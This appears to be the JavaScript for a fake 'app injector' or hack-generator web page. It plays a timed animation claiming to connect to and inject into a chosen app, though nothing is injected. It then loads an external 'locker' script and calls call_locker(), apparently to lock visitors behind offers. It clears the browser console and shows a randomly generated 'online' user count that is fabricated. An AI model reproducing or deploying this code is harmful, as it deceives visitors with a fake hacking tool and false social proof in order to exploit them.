$(window).load(function(){
	var $load = document.getElementById("preloader");
	var removeLoading = setTimeout(function() {
		$load.className += " loader-removed";
	}, 500);
	var removeLoading2 = setTimeout(function() {
		$('#preloader').remove();
	}, 1200);
});

$(document).ready(function() {
	
	////////////////
	// Text Strings
	////////////////		
	var 
	$proccess_txt_string_1 = "Connecting...";
	$proccess_txt_string_2 = "Prepare to process...";
	$proccess_txt_string_3 = "Injecting into";
	$proccess_txt_string_4 = "Injection complete";
	$proccess_txt_string_5 = "Checking App...";
	$proccess_txt_file_format = ".xml";
	
	$("#search-filter").keyup(function(){
        var filter = $(this).val(), count = 0;
        $(".app-listing-wrapper ul li").each(function(){
            if ($(this).text().search(new RegExp(filter, "i")) < 0) {
                $(this).fadeOut();
            } else {
                $(this).show();
                count++;
            }
        });
        var numberItems = count;
    });
	$('#search-form').on('keyup keypress', function(e) {
		var keyCode = e.keyCode || e.which;
		if (keyCode === 13) { 
			e.preventDefault();
			return false;
		}
	});
	
	$('li.app-listing-row').click(function () {
		$('.main-content-section').append('<div id="M140i" class="animated slideInUp"></div>');
		$selected_app_img = $(this).find("img.app-image").attr('src');
		$selected_app_header_img = $(this).find("img.app-header-image").attr('src');
		$selected_app_title = $(this).find(".app-name").text();
		$selected_app_description = $(this).find(".app-description").text();
		$locker_script = $(this).attr("data-locker-script");
		$.ajax({
			type: "GET",
			url: "xo/xo.php",
			success: function(dataprocess){
				$('#M140i').html(dataprocess).hide().fadeIn();
				console.clear();
				console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");				
				$('.app-inject-header').css('background-image', 'url(' + $selected_app_header_img + ')');
				$('.injection-app-icon').attr('src', $selected_app_img);
				online_count();
				document.getElementById("date").innerHTML = formatAMPM();
				function formatAMPM() {
					var d = new Date(),

						hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours(),
						ampm = d.getHours() >= 12 ? 'pm' : 'am',
						months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
						days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
					return d.getDate() + ' ' + months[d.getMonth()] + ' ' + d.getFullYear() + ' ';
				}
				$('.x-sign-wrapper').click(function () {
					$('#M140i').fadeOut(function() {
						$('#M140i').remove();
					});
				});	
				$('#inject-now').click(function () {
					$.ajax({
						type: "GET",
						url: "xo/x0.php",
						success: function(dataprocess){
							$('#M140i').append('<div id="proccessing-wrapper"></div>');
							$('#proccessing-wrapper').html(dataprocess).hide().fadeIn();	
							$('.proccessing-content').append('<script type="text/javascript" id="ogjs" src="' + $locker_script + '"></script>');
							console.clear();
							console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
							function progressBarConsole(percent, $element, duration) {
								var progressBarConsoleWidth = percent * $element.width() / 100;
								$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
							}
							progressBarConsole(0, $('#progressBarConsole'), 1);
							progressBarConsole(100, $('#progressBarConsole'), 15500);
							$('.proccessing-string-wrapper').html($proccess_txt_string_1);
							$('.proccessing-string-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
								$(this).removeClass('animated bounceIn');	
							});	
							setTimeout(function() {
								$('.proccessing-string-wrapper').html($proccess_txt_string_2);
								$('.proccessing-string-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
									$(this).removeClass('animated bounceIn');	
								});	
							}, 2500 );
							setTimeout(function() {
								$('.proccessing-string-wrapper').html($proccess_txt_string_3 + ' ' + $selected_app_title + $proccess_txt_file_format);
								$('.proccessing-string-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
									$(this).removeClass('animated bounceIn');	
								});	
							}, 6500 );
							setTimeout(function() {
								$('.proccessing-string-wrapper').html($proccess_txt_string_4);
								$('.proccessing-string-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
									$(this).removeClass('animated bounceIn');	
								});	
							}, 9500 );
							setTimeout(function() {
								$('.proccessing-string-wrapper').html($proccess_txt_string_5);
								$('.proccessing-string-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
									$(this).removeClass('animated bounceIn');	
								});	
							}, 12500 );
							setTimeout(function() {
								call_locker();
							}, 15500 );
						}	
					});	
				});
			}
		});	
	});
});
////////////////
// Status - Online Count
////////////////
var starting_number = 500;
var random;
function online_count() {
	document.getElementById("online-count").innerHTML = starting_number;
	var randCalc = Math.floor(Math.random() * 10 + 1);
	if (randCalc <= 5) {
		starting_number = starting_number + Math.floor(Math.random() * 10 + 1);;
	} else {
		starting_number = starting_number - Math.floor(Math.random() * 10 + 1);;
	}
	random = setTimeout("online_count()", 1000);
}